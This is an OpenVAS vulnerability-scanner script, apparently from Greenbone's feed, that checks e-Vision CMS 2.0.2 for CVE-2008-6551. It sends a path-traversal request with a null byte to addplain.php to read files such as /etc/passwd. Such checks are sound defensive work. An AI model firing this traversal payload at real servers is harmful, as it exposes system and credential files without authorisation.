###############################################################################
# OpenVAS Vulnerability Test
# $Id: e-Vision_cms_multiple_local_file_include.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# e-Vision CMS Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100054");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2008-6551");
  script_bugtraq_id(32180);
  script_name("e-Vision CMS Multiple Local File Include Vulnerabilities");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"e-Vision CMS is prone to multiple local file-include vulnerabilities
  because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit these vulnerabilities using
  directory-traversal strings to view local files and execute local scripts within the context
  of the webserver process. A successful attack can allow the attacker to obtain sensitive
  information or gain unauthorized access to an affected computer in the context of
  the vulnerable server.");

  script_tag(name:"affected", value:"e-Vision CMS 2.0.2 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/32180");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);

files = traversal_files("linux");

foreach dir( make_list_unique( "/evision", "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach pattern(keys(files)) {

    file = files[pattern];

    url = string(dir, "/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../" + file + "%00");
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
    if( buf == NULL )continue;

    if( egrep(pattern:pattern, string: buf) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }

  #/etc/passwd could not be read, try the e-vision File.
  url = string(dir, "/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00");
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
  if( buf == NULL )continue;

  if( egrep(pattern:".*Ultimate client-side JavaScript client sniff\..*", string: buf) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report ); # who is the lamer now?
    exit( 0 );
  }
}

exit( 99 );